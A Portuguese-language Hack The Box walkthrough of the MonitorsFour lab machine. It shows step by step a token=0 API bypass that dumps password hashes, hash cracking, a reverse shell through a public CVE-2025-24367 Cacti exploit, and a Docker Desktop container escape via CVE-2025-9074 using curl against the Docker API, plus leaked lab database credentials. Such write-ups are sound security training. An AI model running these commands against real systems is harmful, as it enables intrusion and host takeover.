---
title: "Hack The Box - MonitorsFour"
author: "imendes"
date: 2026-01-18
subject: "HTB Walkthrough"
description: "Walkthrough da máquina MonitorsFour (HTB), explorando falhas no Cacti para acesso inicial e posterior escape de container até o sistema host."
keywords: ["HTB", "MonitorsFour", "Cacti", "CVE-2025-24367", "Docker", "CVE-2025-9074", "Docker API", "container escape", "Windows"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [Hack The Box Machines, Windows, Easy]
---

## Introdução

Este relatório documenta o processo de exploração da máquina **MonitorsFour** da plataforma **Hack The Box**.  
A máquina inclui uma instância vulnerável do **Cacti 1.2.28** executando em container Docker. A exploração inicial foi realizada através da **CVE-2025-24367**, permitindo escrita arbitrária de arquivos PHP no webroot. A escalada de privilégios envolveu a exploração da **CVE-2025-9074** na Docker API exposta internamente, permitindo escape do container e acesso ao sistema host Windows através de bind mounts.  
O objetivo foi obter acesso inicial via exploração do Cacti e, em seguida, realizar **escape do container** até obter acesso ao sistema host Windows.

## Metodologia

A metodologia aplicada seguiu as seguintes fases:

- **Coleta de informações** – identificação de portas e serviços expostos via Nmap.  
- **Enumeração** – descoberta de virtual hosts, diretórios e credenciais vazadas.  
- **Exploração** – execução remota de código via CVE-2025-24367 no Cacti.  
- **Pós-exploração** – enumeração do ambiente containerizado e descoberta da Docker API.  
- **Escalada de privilégios** – escape do container via CVE-2025-9074 e acesso ao host Windows.

## Coleta de Informações

### Varredura Nmap

```bash
# Nmap 7.94SVN scan initiated Sun Dec 29 16:16:00 2025 as: nmap -sC -sV -Pn -p80,5985 10.10.11.98
Nmap scan report for 10.10.11.98
Host is up (0.82s latency).
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  wsman   Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Serviços identificados:**

| Porta    | Serviço | Versão                    | Observação                           |
| :------- | :------ | :------------------------ | :----------------------------------- |
| 80/tcp   | HTTP    | nginx                     | Redirecionamento para monitorsfour.htb |
| 5985/tcp | WinRM   | Microsoft HTTPAPI httpd   | Windows Remote Management            |

### Configuração Inicial

Adicionando o domínio ao arquivo hosts:

```bash
echo "10.10.11.98 monitorsfour.htb" | sudo tee -a /etc/hosts
```

## Enumeração

### Enumeração de Diretórios

```bash
gobuster dir -u http://monitorsfour.htb -w /opt/useful/seclists/Discovery/Web-Content/common.txt
```

Durante a enumeração com **gobuster**, foi identificado o diretório `/contact`, que revelou informações sensíveis:

- **Root do servidor web**: `/var/www/html`
- **Tecnologia**: PHP
- **Sistema de arquivos**: Estrutura típica de Linux em container

### Credenciais Vazadas

No diretório raiz foi descoberto o arquivo `.env` contendo credenciais do banco de dados:

```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

### Endpoint de API Vulnerável

Outro resultado da enumeração com gobuster foi o endpoint `/user` que retorna informações de usuários quando fornecido um token:

**Requisição inicial:**

```bash
curl http://monitorsfour.htb/user
```

**Resposta:**

```json
{"error":"Missing token parameter"}
```

**Requisição com injeção de token 0:**

```bash
curl http://monitorsfour.htb/user?token=0
```

**Resposta (usuários extraídos):**

```json
[
  {
    "id":2,
    "username":"admin",
    "email":"admin@monitorsfour.htb",
    "password":"<MARCUS-PASSWORD-HASH>",
    "role":"super user",
    "token":"8024b78f83f102da4f",
    "name":"Marcus Higgins",
    "position":"System Administrator"
  },
  (Hashes de outros usuários)
]
```

#### Quebra de Hashes

Os hashes foram identificados como **MD5** utilizando **hashid**. A quebra foi realizada com **hashcat**:

```bash
hashcat -m 0 -a 0 '<MARCUS-PASSWORD-HASH>' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

**Credencial obtida:**

```
admin:<MARCUS-PASSWORD>
```

As demais senhas não foram quebradas com a wordlist rockyou.

### Análise da Aplicação MonitorsFour

Durante a exploração autenticada do serviço web `monitoursfour.htb` com as credenciais `admin:<MARCUS-PASSWORD>`, informações importantes foram descobertas no changelog:

- **Infraestrutura**: Windows + Docker com Docker Desktop 4.44.2
- **Vulnerabilidade corrigida**: SQL injection error-based em recuperação de senhas
- **Observação**: "Input validation was implemented and SQL error messages was removed from error messages to prevent this attack vector"

### Descoberta de Virtual Host

Enumeração de virtual hosts com **gobuster**:

```bash
gobuster vhost --domain monitorsfour.htb -u http://10.10.11.98 --append-domain \
  -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Resultado:**

```
Found: cacti.monitorsfour.htb Status: 302 [Size: 0] [--> /cacti]
```

Adicionando o subdomínio ao arquivo hosts:

```bash
echo "10.10.11.98 cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
```

### Análise da Aplicação Cacti

Acessando `http://cacti.monitorsfour.htb/cacti/` com as credenciais do marcus descobertas acima (`marcus:<MARCUS-PASSWORD>`), foi identificado o sistema de monitoramento **Cacti versão 1.2.28**.


## Exploração

### Vulnerabilidade CVE-2025-24367

A versão **1.2.28** do Cacti é vulnerável à **CVE-2025-24367**, que permite a criação arbitrária de scripts PHP no webroot da aplicação. Esta vulnerabilidade explora falhas na validação de arquivos de template, permitindo que atacantes autenticados escrevam código PHP malicioso.

#### PoC Utilizada

**Repositório**: [https://github.com/ArmanHZ/CVE-2025-24367-Cacti-PoC](https://github.com/ArmanHZ/CVE-2025-24367-Cacti-PoC)

#### Execução do Exploit

Preparando listener:

```bash
nc -lnvp 9001
```

Executando exploit com credenciais do usuário `marcus` (mesma senha do admin):

```bash
python3 exploit.py -u marcus -p '<MARCUS-PASSWORD>' -i '<attacker-ip>' -l 9001 \
  -url http://cacti.monitorsfour.htb --http-port 8000
```

#### Shell Reverso Obtido

```bash
Connection received on 10.10.11.98 55190
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$
```

O shell foi obtido dentro de um container Docker, como evidenciado pelo hostname em formato hash e pelo ambiente restrito.

### Recuperação da Flag de Usuário

Apesar de estar em ambiente containerizado, foi possível acessar a flag de usuário:

```bash
www-data@821fbd6a43fa:/$ cat /home/marcus/user.txt
```

## Escalada de Privilégios

### Vulnerabilidade CVE-2025-9074


As informações extraídas do Changelog da aplicação web  `monitoursfour.htb` revelam uma versão vulnerável do Docker Desktop 4.44.2 à CVE-2025-9074.

A **CVE-2025-9074** permite que atacantes com acesso à Docker API não autenticada criem containers com bind mounts arbitrários do sistema host. No contexto do Docker Desktop em Windows, o caminho `/mnt/host/c` mapeia diretamente para o drive C: do sistema Windows host.

Esta vulnerabilidade possibilita:

- Leitura e escrita arbitrária de arquivos no host Windows
- Execução de comandos no contexto do host através de containers maliciosos
- Escape completo do ambiente containerizado


### Descoberta da Docker API

Verificando conectividade com a Docker API:

```bash
www-data@821fbd6a43fa:/tmp$ curl http://192.168.65.7:2375/version
```

**Resposta (formatada):**

```json
{
  "Platform": {"Name": "Docker Engine - Community"},
  "Components": [
    {
      "Name": "Engine",
      "Version": "28.3.2",
      "Details": {
        "ApiVersion": "1.51",
        "Arch": "amd64",
        "KernelVersion": "6.6.87.2-microsoft-standard-WSL2",
        "Os": "linux"
      }
    }
  ],
  "Version": "28.3.2",
  "ApiVersion": "1.51"
}
```

#### Criação de Container com Bind Mount

Criando container Alpine com acesso ao drive C: do host Windows:

```bash
curl http://192.168.65.7:2375/containers/create -X POST \
  -H "Content-Type: application/json" \
  --data '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "echo pwned > /host_root/pwn.txt"],
    "HostConfig": {
      "Binds": ["/mnt/host/c:/host_root"]
    }
  }' -o create.json
```

**Resposta:**

```json
{"Id":"3bb1cd38594e872a071b1e187ee2bc891ed35e93ecf10264c8f32e25c2134084","Warnings":[]}
```

#### Extração do Container ID

```bash
www-data@821fbd6a43fa:/tmp$ cid=$(cut -d'"' -f4 create.json)
www-data@821fbd6a43fa:/tmp$ echo $cid
3bb1cd38594e872a071b1e187ee2bc891ed35e93ecf10264c8f32e25c2134084
```

#### Iniciando o Container

```bash
curl http://192.168.65.7:2375/containers/$cid/start -X POST --data ''
```

#### Verificação de Escrita no Host

Testando escrita de arquivo no host Windows:

```bash
curl http://192.168.65.7:2375/containers/$cid/archive?path=/host_root/pwn.txt
```

**Resposta:**

```
pwn.txt0000644000000000000000000000000615125065544010614 ...
```

A escrita foi bem-sucedida, confirmando acesso ao sistema de arquivos do host.

### Recuperação da Flag Root

#### Leitura da Flag via Docker API

Acessando a flag do Administrator no host Windows:

```bash
curl "http://192.168.65.7:2375/containers/$cid/archive?\
path=/host_root/Users/Administrator/Desktop/root.txt" > flag.tar
```

#### Extração do Conteúdo

```bash
www-data@821fbd6a43fa:/tmp$ tar -xf flag.tar
www-data@821fbd6a43fa:/tmp$ cat root.txt
```

Flag root obtida com sucesso através de escape do container.

**Resumo técnico:**

| Etapa          | Vetor de Ataque                           | Resultado            |
| :------------- | :---------------------------------------- | :------------------- |
| Enumeração     | API endpoint /user → hash MD5             | Credencial admin     |
| Acesso inicial | CVE-2025-24367 em Cacti 1.2.28            | Shell em container   |
| Enumeração     | Linpeas → Docker API 192.168.65.7:2375    | API não autenticada  |
| Escalada       | CVE-2025-9074 → bind mount /mnt/host/c    | Acesso ao host Windows |

## Referências

- [CVE-2025-24367 PoC - Cacti RCE](https://github.com/ArmanHZ/CVE-2025-24367-Cacti-PoC)
- [CVE-2025-9074 - Docker API Container Escape](https://blog.qwertysecurity.com/Articles/blog3.html#videopoc)
- [Docker Engine API Documentation](https://docs.docker.com/reference/api/engine/version/v1.52/#tag/Container)
- [Docker Desktop Security Considerations](https://docs.docker.com/desktop/security/)
